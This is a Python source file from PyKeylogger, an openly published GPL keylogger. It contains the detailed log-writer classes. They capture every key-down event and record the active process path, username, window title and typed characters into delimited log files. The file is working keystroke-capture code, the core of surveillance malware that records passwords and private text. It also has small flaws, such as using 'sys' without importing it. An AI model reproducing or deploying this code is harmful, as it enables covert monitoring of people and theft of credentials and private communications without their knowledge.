##############################################################################
##
## PyKeylogger: Simple Python Keylogger for Windows
## Copyright (C) 2009  nanotube@users.sf.net
##
## http://pykeylogger.sourceforge.net/
##
## This program is free software; you can redistribute it and/or
## modify it under the terms of the GNU General Public License
## as published by the Free Software Foundation; either version 3
## of the License, or (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##
##############################################################################

from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
    to_unicode)
from Queue import Queue, Empty
import os
import os.path
import logging
import time
import re

if os.name == 'posix':
    pass
elif os.name == 'nt':
    import win32api, win32con, win32process
else:
    print "OS is not recognised as windows or linux"
    sys.exit()

from baseeventclasses import *
    
class DetailedLogWriterFirstStage(FirstStageBaseEventClass):
    '''Standard detailed log writer, first stage.
    
    Grabs keyboard events, finds the process name and username, then 
    passes the event on to the second stage.
    '''
    
    def __init__(self, *args, **kwargs):
        
        FirstStageBaseEventClass.__init__(self, *args, **kwargs)
        
        self.task_function = self.process_event
            
    def process_event(self):
        try:
            event = self.q.get(timeout=0.05) #need the timeout so that thread terminates properly when exiting
            if not event.MessageName.startswith('key down'):
                self.logger.debug('not a useful event')
                return
            process_name = self.get_process_name(event)
            loggable = self.needs_logging(event, process_name)  # see if the program is in the no-log list.
            if not loggable:
                self.logger.debug("not loggable, we are outta here\n")
                return
            self.logger.debug("loggable, lets log it. key: %s" % \
                to_unicode(event.Key))
            
            username = self.get_username()
            
            self.sst_q.put((process_name, username, event))
            
        except Empty:
            pass #let's keep iterating
        except:
            self.logger.debug("some exception was caught in "
                "the logwriter loop...\nhere it is:\n", exc_info=True)
            pass #let's keep iterating
    
    def needs_logging(self, event, process_name):
        '''This function returns False if the process name associated with an event
        is listed in the noLog option, and True otherwise.'''
        
        if self.subsettings['General']['Applications Not Logged'] != 'None':
            for path in self.subsettings['General']['Applications Not Logged'].split(';'):
                if os.path.exists(path) and os.stat(path) == os.stat(process_name):  #we use os.stat instead of comparing strings due to multiple possible representations of a path
                    return False
        return True

    def get_process_name(self, event):
        '''Acquire the process name from the window handle for use in the log filename.
        '''
        if os.name == 'nt':
            hwnd = event.Window
            try:
                threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
                
                # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
                
                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
                return procname
            except:
                # this happens frequently enough - when the last event caused the closure of the window or program
                # so we just return a nice string and don't worry about it.
                return "noprocname"
        elif os.name == 'posix':
            return to_unicode(event.WindowProcName)
            
    def get_username(self):
        '''Try a few different environment vars to get the username.'''
        username = None
        for varname in ['USERNAME','USER','LOGNAME']:
            username = os.getenv(varname)
            if username is not None:
                break
        if username is None:
            username = 'none'
        return username

    def spawn_second_stage_thread(self): 
        self.sst_q = Queue(0)
        self.sst = DetailedLogWriterSecondStage(self.dir_lock, 
                                                self.sst_q, self.loggername)

class DetailedLogWriterSecondStage(SecondStageBaseEventClass):
    def __init__(self, dir_lock, *args, **kwargs):
        SecondStageBaseEventClass.__init__(self, dir_lock, *args, **kwargs)
        
        self.task_function = self.process_event
        
        self.eventlist = range(7) #initialize our eventlist to something.
        
        if self.subsettings['General']['Log Key Count'] == True:
            self.eventlist.append(7)
        
        self.logger = logging.getLogger(self.loggername)
        
        # for brevity
        self.field_sep = \
            self.subsettings['General']['Log File Field Separator']
            
    def process_event(self):
        try:
            (process_name, username, event) = self.q.get(timeout=0.05) #need the timeout so that thread terminates properly when exiting
            
            eventlisttmp = [to_unicode(time.strftime('%Y%m%d')), # date
                to_unicode(time.strftime('%H%M')), # time
                to_unicode(process_name).replace(self.field_sep,
                    '[sep_key]'), # process name (full path on windows, just name on linux)
                to_unicode(event.Window), # window handle
                to_unicode(username).replace(self.field_sep, 
                    '[sep_key]'), # username
                to_unicode(event.WindowName).replace(self.field_sep, 
                    '[sep_key]')] # window title
                            
            if self.subsettings['General']['Log Key Count'] == True:
                eventlisttmp.append('1')
            eventlisttmp.append(to_unicode(self.parse_event_value(event)))
                
            if (self.eventlist[:6] == eventlisttmp[:6]) and \
                (self.subsettings['General']['Limit Keylog Field Size'] == 0 or \
                (len(self.eventlist[-1]) + len(eventlisttmp[-1])) < self.settings['General']['Limit Keylog Field Size']):
                
                #append char to log
                self.eventlist[-1] = self.eventlist[-1] + eventlisttmp[-1]
                # increase stroke count
                if self.subsettings['General']['Log Key Count'] == True:
                    self.eventlist[-2] = str(int(self.eventlist[-2]) + 1)
            else:
                self.write_to_logfile()
                self.eventlist = eventlisttmp
        except Empty:
            # check if the minute has rolled over, if so, write it out
            if self.eventlist[:2] != range(2) and \
                self.eventlist[:2] != [to_unicode(time.strftime('%Y%m%d')), 
                to_unicode(time.strftime('%H%M'))]:
                self.write_to_logfile()
                self.eventlist = range(7) # blank it out after writing
            
        except:
            self.logger.debug("some exception was caught in the "
                "logwriter loop...\nhere it is:\n", exc_info=True)
            pass #let's keep iterating

    def parse_event_value(self, event):
        '''Pass the event ascii value through the requisite filters.
        Returns the result as a string.
        '''
        npchrstr = self.subsettings['General']['Non-printing Character Representation']
        npchrstr = re.sub('%keyname%', event.Key, npchrstr)
        npchrstr = re.sub('%scancode%', str(event.ScanCode), npchrstr)
        npchrstr = re.sub('%vkcode%', str(event.KeyID), npchrstr)
        
        if chr(event.Ascii) == self.field_sep:
            return(npchrstr)
        
        #translate backspace into text string, if option is set.
        if event.Ascii == 8 and \
                self.subsettings['General']['Parse Backspace'] == True:
            return(npchrstr)
        
        #translate escape into text string, if option is set.
        if event.Ascii == 27 and \
                self.subsettings['General']['Parse Escape'] == True:
            return(npchrstr)

        # need to parse the returns, so as not to break up the data lines
        if event.Ascii == 13:
            return(npchrstr)
            
        # We translate all the special keys, such as arrows, backspace, 
        # into text strings for logging.
        # Exclude shift and capslock keys, because they are already 
        # represented  (as capital letters/symbols).
        if event.Ascii == 0 and \
                not (str(event.Key).endswith('shift') or \
                str(event.Key).endswith('Capital')):
            return(npchrstr)
        
        return(chr(event.Ascii))

    def write_to_logfile(self):
        '''Write the latest eventlist to logfile in one delimited line.
        '''
        
        if self.eventlist[:7] != range(7):
            try:
                line = to_unicode(self.field_sep).join(self.eventlist)
                self.logger.info(line)
            except:
                self.logger.debug(to_unicode(self.eventlist), 
                    exc_info=True)
                pass # keep going, even though this doesn't get logged...

    def cancel(self):
        '''Override this to make sure to write any remaining info to log.'''
        self.write_to_logfile()
        SecondStageBaseEventClass.cancel(self)
